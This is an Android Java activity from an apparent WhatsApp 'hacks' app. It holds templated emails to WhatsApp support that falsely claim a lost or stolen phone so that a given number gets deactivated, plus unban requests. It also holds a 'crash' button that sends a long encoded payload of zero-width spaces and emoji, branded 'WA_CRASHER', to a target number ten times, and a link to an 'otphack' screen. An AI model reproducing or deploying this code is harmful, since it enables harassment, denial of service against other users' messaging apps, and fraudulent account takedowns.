package com.umrani.tool.view.main;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.firebase.FirebaseApp;
import com.umrani.tool.R;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;


public class ActivityWhatsapp extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(1);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS, WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);
        getWindow().setStatusBarColor(Color.TRANSPARENT);
        setContentView(R.layout.whatsapphacks);

        EditText unbanbox = findViewById(R.id.unbanbox);
        EditText banbox = findViewById(R.id.banbox);
        EditText crashbox = findViewById(R.id.crashbox);

        Button unbanbutton1 = findViewById(R.id.unbanbutton1);
        unbanbutton1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] recipients = {"smb@support.whatsapp.com", "support@support.whatsapp.com", "android_web@support.whatsapp.com", "   android@support.whatsapp.com", " android@whatsapp.com"};
                String subject = "Help Me Unban My WhatsApp Number.";
                String phoneNumber = unbanbox.getText().toString();
                String body = "Hello dear WhatsApp team or developers, suddenly my WhatsApp account has been banned and I don't know the reason, I ask you to reactivate or Unban my number because I have family in another country and \n" +
                        "I need to communicate with them and i have too many students for teaching programming sharing everyday lessons to my students. \n" +
                        "Please reactivate my WhatsApp.\n\nMy WhatsApp Number: " + phoneNumber;

                Intent intent = new Intent(Intent.ACTION_SENDTO);
                intent.setData(Uri.parse("mailto:"));
                intent.putExtra(Intent.EXTRA_EMAIL, recipients);
                intent.putExtra(Intent.EXTRA_SUBJECT, subject);
                intent.putExtra(Intent.EXTRA_TEXT, body);
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivity(intent);
                } else {
                    // Handle case where no email app is available
                    Toast.makeText(getApplicationContext(), "No email app found.", Toast.LENGTH_SHORT).show();
                }
            }
        });

        Button unbanbutton2 = findViewById(R.id.unbanbutton2);
        unbanbutton2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] recipients = {"smb@support.whatsapp.com", "support@support.whatsapp.com", "android_web@support.whatsapp.com", "   android@support.whatsapp.com", " android@whatsapp.com"};
                String subject = "Help Me Unban My WhatsApp Number.";
                String phoneNumber = unbanbox.getText().toString();
                String body = "Hello dear WhatsApp team or developers I was switching from whatsapp to WhatsApp business and my account got suddenly banned. Right now I can't use WhatsApp Please unban my account and i didn't do anything wrong and .\n\nMy WhatsApp Number: " + phoneNumber;

                Intent intent = new Intent(Intent.ACTION_SENDTO);
                intent.setData(Uri.parse("mailto:"));
                intent.putExtra(Intent.EXTRA_EMAIL, recipients);
                intent.putExtra(Intent.EXTRA_SUBJECT, subject);
                intent.putExtra(Intent.EXTRA_TEXT, body);
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivity(intent);
                } else {
                    // Handle case where no email app is available
                    Toast.makeText(getApplicationContext(), "No email app found.", Toast.LENGTH_SHORT).show();
                }
            }
        });

        Button banbutton1 = findViewById(R.id.banbutton1);
        banbutton1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] recipients = {"smb@support.whatsapp.com", "support@support.whatsapp.com", "android_web@support.whatsapp.com", "   android@support.whatsapp.com", " android@whatsapp.com"};
                String subject = "Help Me Ban And Deactivate My WhatsApp Number.";
                String phoneNumber = banbox.getText().toString();
                String body = "Hello, I lost my documents along with my phone and SIM card. so i want you to deactivate my number immediately i got hacked im afraid someone can get into my whatsapp account because it has important information about me.\n\nMy WhatsApp Number: " + phoneNumber;

                Intent intent = new Intent(Intent.ACTION_SENDTO);
                intent.setData(Uri.parse("mailto:"));
                intent.putExtra(Intent.EXTRA_EMAIL, recipients);
                intent.putExtra(Intent.EXTRA_SUBJECT, subject);
                intent.putExtra(Intent.EXTRA_TEXT, body);
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivity(intent);
                } else {
                    // Handle case where no email app is available
                    Toast.makeText(getApplicationContext(), "No email app found.", Toast.LENGTH_SHORT).show();
                }
            }
        });

        Button banbutton2 = findViewById(R.id.banbutton2);
        banbutton2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] recipients = {"smb@support.whatsapp.com", "support@support.whatsapp.com", "android_web@support.whatsapp.com", "   android@support.whatsapp.com", " android@whatsapp.com"};
                String subject = "Help Me Ban And Deactivate My WhatsApp Number.";
                String phoneNumber = banbox.getText().toString();
                String body = "Hello, please deactivate this number, as I lost my phone and someone is using my number, please deactivate my number.\n\nMy WhatsApp Number: " + phoneNumber;

                Intent intent = new Intent(Intent.ACTION_SENDTO);
                intent.setData(Uri.parse("mailto:"));
                intent.putExtra(Intent.EXTRA_EMAIL, recipients);
                intent.putExtra(Intent.EXTRA_SUBJECT, subject);
                intent.putExtra(Intent.EXTRA_TEXT, body);
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivity(intent);
                } else {
                    // Handle case where no email app is available
                    Toast.makeText(getApplicationContext(), "No email app found.", Toast.LENGTH_SHORT).show();
                }
            }
        });

        Button banbutton3 = findViewById(R.id.banbutton3);
        banbutton3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String[] recipients = {"smb@support.whatsapp.com", "support@support.whatsapp.com", "android_web@support.whatsapp.com", "   android@support.whatsapp.com", " android@whatsapp.com"};
                String subject = "Help Me Ban And Deactivate My WhatsApp Number.";
                String phoneNumber = banbox.getText().toString();
                String body = "Hello, I lost all my documents and my SIM card was stolen. Please deactivate my number immediately \n\nMy WhatsApp Number: " + phoneNumber;

                Intent intent = new Intent(Intent.ACTION_SENDTO);
                intent.setData(Uri.parse("mailto:"));
                intent.putExtra(Intent.EXTRA_EMAIL, recipients);
                intent.putExtra(Intent.EXTRA_SUBJECT, subject);
                intent.putExtra(Intent.EXTRA_TEXT, body);
                if (intent.resolveActivity(getPackageManager()) != null) {
                    startActivity(intent);
                } else {
                    // Handle case where no email app is available
                    Toast.makeText(getApplicationContext(), "No email app found.", Toast.LENGTH_SHORT).show();
                }
            }
        });

        Button crashbutton = findViewById(R.id.crashbutton);
        crashbutton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                int numberOfMessages = 10; // Default number of messages to send
                // Show a dialog or input field to allow the user to select the number of messages
                // and assign the selected value to the "numberOfMessages" variable.
                int quantity = 2; // Desired quantity
                String phoneNumber = crashbox.getText().toString();
                String message = "ok";
                for (int i = 0; i < numberOfMessages; i++) {
                    message = "Your WhatsApp is crashed with Umrani Tool.\n\n" + repeatString("XPHANTOM%20%F0%9F%92%A3%20TeaM%20XPH4N70M%F0%9F%92%A3%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%20%E2%80%8A%0A%F0%9F%98%88Follow%20Me%20On%20Insta%20%40XPHANTOM_PH4N70M%F0%9F%A4%A3%0A%F0%9F%94%A5WA_CRASHER%201%20WA_CRASH%20%F0%9F%98%88%0A*NULL%0A*9999999999*%20*X*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*XPHANTOM%20CRATER%20MR%20PH4N70M%20X%C2%B2*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A%F0%9F%93%8CBY%E2%80%A2MR%E2%80%A2KILLER-XPHANTOM%F0%9F%92%A3%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*%20*8888888888*%0A*9999999999*%20*XPHANTOM*%20*9999999999*%0A*8888888888*%20*XPHANTOM*", quantity); // Repeat the heart symbol based on the quantity
                    sendMessageViaWhatsApp(phoneNumber, message);
                }
            }
        });

        Button otpbutton = findViewById(R.id.otpbutton);
        otpbutton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(getApplicationContext(),  otphack.class));
            }
        });




    }




    private String repeatString(String input, int count) {
        if (input.isEmpty() || count == 0) {
            return "";
        }
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < count; i++) {
            result.append(input);
        }
        return result.toString();
    }

    private void sendMessageViaWhatsApp(String phoneNumber, String message) {
        try {
            String[] packageNames = {"com.whatsapp", "com.whatsapp.w4b", "com.gbwhatsapp"}; // Package names for WhatsApp and WhatsApp Business
            Uri uri = Uri.parse("https://api.whatsapp.com/send?phone=" + phoneNumber + "&text=" + URLEncoder.encode(message, "UTF-8"));
            Intent intent = new Intent(Intent.ACTION_VIEW, uri);
            intent.putExtra(Intent.EXTRA_PACKAGE_NAME, packageNames);
            startActivity(Intent.createChooser(intent, "Select WhatsApp Application"));
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (ActivityNotFoundException e) {
            Toast.makeText(getApplicationContext(), "WhatsApp is not installed.", Toast.LENGTH_SHORT).show();
        }
    }

}
